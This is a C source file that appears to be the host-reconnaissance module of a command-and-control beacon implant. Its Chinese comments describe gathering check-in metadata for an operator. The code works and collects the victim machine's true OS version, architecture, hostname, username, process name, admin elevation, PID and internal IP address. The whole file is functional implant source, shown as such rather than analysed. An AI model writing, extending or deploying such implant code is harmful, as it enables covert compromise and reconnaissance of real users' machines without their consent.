#include "beacon_sysinfo.h"
#include "beacon_api.h"

#pragma warning(disable: 4996)

#include <iphlpapi.h>
#include <iptypes.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

/*
 * 用 RtlGetVersion 读取真实 OS 版本。
 * GetVersionExW 受 manifest 兼容性垫片影响，Win10+ 上常谎报 6.2/6.3。
 *
 * 注意初始化顺序：SysinfoCollect 在 Win32ApiInit 之前执行（ContextInit 内），
 * 不能依赖 ctx.api.pfnRtlGetVersion；且本文件其余调用均为明文 API（一次性
 * 元数据收集，非热路径），故此处直接 GetProcAddress，失败时退回 GetVersionExW。
 */
static VOID SysinfoOsVersion(MetaData* m)
{
    typedef NTSTATUS(NTAPI* fnRtlGetVersionLocal)(PMY_RTL_OSVERSIONINFOW);
    MY_RTL_OSVERSIONINFOW rtl;
    OSVERSIONINFOW osvi;
    HMODULE ntdll;
    fnRtlGetVersionLocal pfn;

    ZeroMemory(&rtl, sizeof(rtl));
    rtl.dwOSVersionInfoSize = sizeof(rtl);

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        pfn = (fnRtlGetVersionLocal)(VOID*)GetProcAddress(ntdll, "RtlGetVersion");
        if (pfn && pfn(&rtl) == 0) {
            snprintf(m->os, sizeof(m->os), "Windows %lu.%lu.%lu",
                     rtl.dwMajorVersion, rtl.dwMinorVersion, rtl.dwBuildNumber);
            return;
        }
    }

    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (GetVersionExW(&osvi)) {
        snprintf(m->os, sizeof(m->os), "Windows %lu.%lu.%lu",
                 osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    }
}

/* 收集上线 metadata 所需的主机、用户、权限、进程和内网 IP 信息。 */
VOID SysinfoCollect(MetaData* m)
{
    DWORD size;
    WCHAR wbuf[512];
    CHAR* utf8;
    HANDLE token = NULL;
    TOKEN_ELEVATION elev;
    DWORD ret_len = 0;

    ZeroMemory(m, sizeof(*m));

    /* -- 操作系统版本字符串（RtlGetVersion，避免 manifest 垫片谎报） ---------- */
    SysinfoOsVersion(m);

    /* -- 架构 ------------------------------------------------------------- */
#if defined(_M_X64)
    strcpy_s(m->arch, sizeof(m->arch), "x64");
#elif defined(_M_IX86)
    strcpy_s(m->arch, sizeof(m->arch), "x86");
#else
    strcpy_s(m->arch, sizeof(m->arch), "unknown");
#endif

    /* -- 主机名 ----------------------------------------------------------- */
    size = ARRAYSIZE(wbuf);
    if (GetComputerNameW(wbuf, &size)) {
        utf8 = WideToUtf8(wbuf);
        if (utf8) {
            strcpy_s(m->hostname, sizeof(m->hostname), utf8);
            HeapFree(GetProcessHeap(), 0, utf8);
        }
    }

    /* -- 用户名 ----------------------------------------------------------- */
    size = ARRAYSIZE(wbuf);
    if (GetUserNameW(wbuf, &size)) {
        utf8 = WideToUtf8(wbuf);
        if (utf8) {
            strcpy_s(m->username, sizeof(m->username), utf8);
            HeapFree(GetProcessHeap(), 0, utf8);
        }
    }

    /* -- 当前进程名（去除路径） -------------------------------------------- */
    size = ARRAYSIZE(wbuf);
    if (QueryFullProcessImageNameW(GetCurrentProcess(), 0, wbuf, &size)) {
        WCHAR* slash = wcsrchr(wbuf, L'\\');
        utf8 = WideToUtf8(slash ? slash + 1 : wbuf);
        if (utf8) {
            strcpy_s(m->process_name, sizeof(m->process_name), utf8);
            HeapFree(GetProcessHeap(), 0, utf8);
        }
    }

    /* -- 管理员权限检查 --------------------------------------------------- */
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &ret_len)) {
            m->is_admin = elev.TokenIsElevated ? 1 : 0;
        }
        CloseHandle(token);
    }

    /* -- 进程 ID 和活动代码页 --------------------------------------------- */
    m->pid = GetCurrentProcessId();
    m->acp = GetACP();

    /* -- 内部 IP（第一个非回环 IPv4 适配器地址） --------------------------- */
    strcpy_s(m->internal_ip, sizeof(m->internal_ip), "127.0.0.1");
    {
        /* ERROR_BUFFER_OVERFLOW 是该 API 的常规路径（多适配器机器 15KB 不够），
           按返回的所需长度放大重试；旧实现单次调用失败即静默回落 127.0.0.1。 */
        ULONG buflen = 15000;
        IP_ADAPTER_ADDRESSES* addrs = NULL;
        ULONG rc = ERROR_BUFFER_OVERFLOW;
        INT attempt;

        for (attempt = 0; attempt < 3 && rc == ERROR_BUFFER_OVERFLOW; ++attempt) {
            HeapFree(GetProcessHeap(), 0, addrs);
            addrs = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), 0, buflen);
            if (!addrs) break;
            rc = GetAdaptersAddresses(AF_INET, 0, NULL, addrs, &buflen);
        }

        if (addrs && rc == NO_ERROR) {
            IP_ADAPTER_ADDRESSES* a;
            INT found = 0;

            for (a = addrs; a && !found; a = a->Next) {
                IP_ADAPTER_UNICAST_ADDRESS* u;

                /* 跳过未启用的适配器 */
                if (a->OperStatus != IfOperStatusUp) continue;

                for (u = a->FirstUnicastAddress; u; u = u->Next) {
                    SOCKADDR_IN* sin;
                    CHAR ip[64];

                    /* 仅考虑 IPv4 单播地址 */
                    if (!u->Address.lpSockaddr ||
                        u->Address.lpSockaddr->sa_family != AF_INET) continue;

                    sin = (SOCKADDR_IN*)u->Address.lpSockaddr;
                    if (InetNtopA(AF_INET, &sin->sin_addr, ip, sizeof(ip)) &&
                        strcmp(ip, "127.0.0.1") != 0) {
                        strcpy_s(m->internal_ip, sizeof(m->internal_ip), ip);
                        found = 1;
                        break;
                    }
                }
            }
        }

        HeapFree(GetProcessHeap(), 0, addrs);
    }
}
